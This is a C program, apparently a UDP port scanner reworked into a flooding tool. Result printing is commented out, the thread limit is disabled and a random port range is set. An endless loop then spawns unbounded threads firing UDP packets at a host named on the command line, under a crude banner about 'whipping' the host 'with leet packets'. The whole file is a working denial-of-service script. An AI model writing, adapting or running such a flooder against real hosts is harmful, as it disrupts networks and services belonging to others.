/*
   created by nonfind@kisa.or.kr
 
 */

#include <errno.h>
#include <netdb.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>

void usage (char *program);
void *scanport (void *arg);
char *elapsed (struct timeval first, struct timeval second);

struct sockaddr_in s_in;
FILE *out;
pthread_mutex_t varlock = PTHREAD_MUTEX_INITIALIZER;
pthread_t threadid;
int numthreads = 0, done = 0, ready = 0;
u_short lower, upper;

#define MAXTHREADS 256   /* The maximum number of concurrent threads available */
#define TIMEOUT 0 
#define NUMRETRIES 100    /* Number of times to retry when no error or datagram
                           is received in reply */


void
usage (char *program)
{
  fprintf (stderr,
           "Usage:%s <desthost>\n",program);
  exit (-1);
}

void *
scanport (void *arg)
{
  struct sockaddr_in mys_in = s_in;
  struct servent *se;
  struct timeval tv;
  fd_set readfd;
  u_short port;
  char data[1], *alphaport;
  int error, udpsocket, counter, open;

  pthread_mutex_lock (&varlock);
  numthreads++;
  pthread_mutex_unlock (&varlock);

  if ((udpsocket = socket (PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    return;

  pthread_detach (pthread_self ());
  port = (u_short) arg;
  mys_in.sin_port = htons (port);

  if (connect (udpsocket, (struct sockaddr *) &mys_in, sizeof (
               struct sockaddr_in)) == 0)
    {


      for (counter = 0; counter < NUMRETRIES; counter++)
        {
          FD_ZERO (&readfd);
          FD_SET (udpsocket, &readfd);
          tv.tv_sec = TIMEOUT;
          tv.tv_usec = 0;

          send (udpsocket, data, 0, 0);
          error = select ((udpsocket + 1), &readfd, NULL, NULL, &tv);

          switch(error)
            {
              case (-1):
                fprintf (stderr, "Select() failed; exiting.\n");
                exit (-1);
                break;
              case 0:
                open = 1;
                break;
              case 1:
                open = (recv (udpsocket, data, 0, 0) != -1);
                break;
            }   

          if (error != 0)
            break;

        /* If error was 0, there was no reply; we retry for 
           a variable number of times */

        }

      if (open)
        {

       /* It may seem silly to print to a buffer first, but we must
        * printf() in one fell swoop to avoid the threads accessing
        * stdout concurrently and merging their output. */

    //      alphaport = (char *) malloc (8);

   //       if (error == 0)
   //         snprintf (alphaport, 7, "[%d]", port);
    //      else
      //      snprintf (alphaport, 7, "%d", port);
         
        //  if ((se = getservbyport (htons (port), "udp")) != NULL)
          //  fprintf (out, " %s (%s),", alphaport, se->s_name);
         // else
  //          fprintf (out, " %s,", alphaport);

        }

    }

  fflush(out);
  close (udpsocket);
  pthread_mutex_lock (&varlock);
  numthreads--;

  if (port == upper)
    done = 1;

  if ((done) && (!(numthreads)))
    ready = 1;

  pthread_mutex_unlock (&varlock);

  pthread_exit (NULL);
  return;
}


int
main (int argc, char *argv[])
{
  pthread_t threadid;
  struct timeval initial, final;
  struct hostent *he;
  u_short inc;

  if (argc != 2)
    usage (argv[0]);

  //if ((!(lower = atoi (argv[2]))) || (!(upper = atoi (argv[3]))))
  //  {
   //   fprintf (stderr, "Invalid lower or upper port specified! Exiting.\n");
   //   exit(-1);
   // }

  if ((he = gethostbyname (argv[1])) == NULL)
    {
      fprintf (stderr, "Unable to resolve target host! Exiting.\n");
      exit (-1);
    }

  memset (&s_in, 0, sizeof (s_in));
  s_in.sin_family = AF_INET;
  memcpy (&s_in.sin_addr.s_addr, he->h_addr, he->h_length);

//  if (upper < lower)
//    {
      inc = 65535;//upper;
      upper = rand(); //lower;
      lower = rand(); //inc;            
//    }

  out = fdopen (fileno (stdout), "w");
  fprintf(out, "\nCock whipping host : %s with leet packets ", inet_ntoa (s_in.sin_addr));
  fflush (out);

  gettimeofday (&initial, NULL);
  /* We've prepped everything, now it's time to scan each host in a loop */
while(1)
  for (inc = lower - 1; inc<= upper; inc++)
    {
//      while (numthreads >= MAXTHREADS)
//        ;       /* A null loop to wait until space is freed */  
      pthread_create (&threadid, NULL, scanport, (void *) inc);
    }

  while (!(ready)) { }  /* Another null loop to wait for all scanning to get done */

  gettimeofday (&final, NULL);
  printf ("\nFinished scan for a total of %s seconds.\n",
          elapsed (initial, final));
}


char * 
elapsed (struct timeval first, struct timeval second) 
{
  char *length;         /* x.yy Seconds.hundredths */
  double a, b, diff;
  
  length = (char *) malloc (7);
  a = first.tv_sec + ((double) (first.tv_usec) / 1000000);
  b = second.tv_sec + ((double) (second.tv_usec) / 1000000);
  diff = b - a;
  snprintf (length, 6, "%2f", diff);
  return (length);
}
